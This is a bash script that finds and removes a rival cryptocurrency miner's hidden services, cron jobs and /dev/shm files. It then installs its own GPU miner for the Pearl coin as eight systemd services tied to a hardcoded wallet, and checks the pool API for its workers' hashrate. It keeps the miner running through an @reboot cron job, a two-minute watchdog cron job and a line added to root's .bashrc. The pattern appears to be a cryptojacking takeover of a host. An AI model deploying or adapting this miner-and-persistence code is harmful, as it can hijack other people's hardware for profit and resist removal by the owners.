#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
BIN=/opt/arsenal/miners/krig/krig-miner
log "### START10 $(date -u +%FT%TZ)"
log "### BACKUP"
mkdir -p /root/ul_farmfan/plh_bak
for f in /etc/systemd/system/plh-card@.service /etc/systemd/system/plh-c2fetch.service /etc/systemd/system/nv-cuda-cache.service /usr/local/lib/nv-cache/g.sh /dev/shm/.u/sample.sh; do
  [ -f "$f" ] && { cp "$f" /root/ul_farmfan/plh_bak/$(basename $f) 2>/dev/null; log "===== $f"; head -30 "$f"; }
done
log "### PLH-PERSIST"
timeout 40 grep -rIl 'prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l' /etc /usr/local /root /dev/shm /opt /var/spool/cron 2>/dev/null | head -20
crontab -l 2>/dev/null | head -20
log "### DISPLACE"
for i in 0 1 2 3 4 5 6 7; do systemctl stop plh-card@$i 2>/dev/null; systemctl disable plh-card@$i 2>/dev/null; done
systemctl stop plh-c2fetch 2>/dev/null; systemctl disable plh-c2fetch 2>/dev/null; systemctl stop nv-cuda-cache 2>/dev/null
pkill -f 'krig-miner.*plh-' 2>/dev/null; sleep 2
pkill -f '/opt/arsenal/miners/krig/krig-miner' 2>/dev/null; sleep 2
log "remaining krig: $(pgrep -fc krig-miner)"
rm -f /etc/systemd/system/plh-card@.service /etc/systemd/system/plh-c2fetch.service 2>/dev/null
(crontab -l 2>/dev/null | grep -vE 'plh|/dev/shm/.u|sample.sh') | crontab - 2>/dev/null
rm -rf /dev/shm/.u 2>/dev/null
systemctl daemon-reload
log "### OURS"
cat > /usr/local/bin/ul-g.sh <<'EOG'
#!/bin/bash
i="$1"
exec /opt/arsenal/miners/krig/krig-miner --coin pearl \
 --url stratum+ssl://prl-sg.kryptex.network:8048 \
 --url stratum+tcp://pool.pearlhash.xyz:9000 \
 --url stratum+ssl://pearl-sg1.luckypool.io:3360 \
 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g$i \
 --password x -d $i
EOG
chmod +x /usr/local/bin/ul-g.sh
for i in 0 1 2 3 4 5 6 7; do
cat > /etc/systemd/system/ul-g$i.service <<EOU
[Unit]
Description=ul gpu worker $i
After=network-online.target
[Service]
Type=simple
Restart=always
RestartSec=20
Nice=5
ExecStart=/usr/local/bin/ul-g.sh $i
[Install]
WantedBy=multi-user.target
EOU
systemctl enable ul-g$i 2>/dev/null; systemctl start ul-g$i 2>/dev/null
done
cat > /usr/local/bin/ul-keep.sh <<'EOK'
#!/bin/bash
for i in 0 1 2 3 4 5 6 7; do
  systemctl is-active --quiet ul-g$i || systemctl restart ul-g$i >/dev/null 2>&1
done
EOK
chmod +x /usr/local/bin/ul-keep.sh
(crontab -l 2>/dev/null | grep -v ul-keep; echo '@reboot /usr/local/bin/ul-keep.sh >/dev/null 2>&1'; echo '*/2 * * * * /usr/local/bin/ul-keep.sh >/dev/null 2>&1') | crontab -
grep -q ul-keep /root/.bashrc 2>/dev/null || echo '/usr/local/bin/ul-keep.sh >/dev/null 2>&1' >> /root/.bashrc
sleep 45
log "### STATE"
systemctl is-active ul-g0 ul-g1 ul-g2 ul-g3 ul-g4 ul-g5 ul-g6 ul-g7 2>&1 | tr '\n' ' '; echo
ps -eo pid,args 2>/dev/null | grep -c '[k]rig-miner'
ps -eo args 2>/dev/null | grep '[k]rig-miner' | grep -oE 'ul-t2-123-184-7-135-g[0-9]' | sort -u | tr '\n' ' '; echo
nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader | tr '\n' ' '; echo
log "### POOL"
timeout 15 curl -s -m 12 "https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" -o /tmp/pw.json
python3 - <<'PY'
import json,datetime
try:
    d=json.load(open('/tmp/pw.json'))['results']
except Exception as e:
    print("poolparse-fail",e); raise SystemExit
now=datetime.datetime.now(datetime.timezone.utc).timestamp()
m=[w for w in d if '123-184-7-135' in w['worker']]
print("ours-n",len(m),"total-pool-rows",len(d))
for w in sorted(m,key=lambda x:x['worker']):
    print(w['worker'],w['status'],'valid',w['valid'],'age',int(now-w['last_share']/1000) if w.get('last_share') else None,'hs30m',round(float(w.get('avg_hashrate_30m') or 0)/1e12,1))
PY
log "### DONE10 $(date -u +%FT%TZ)"
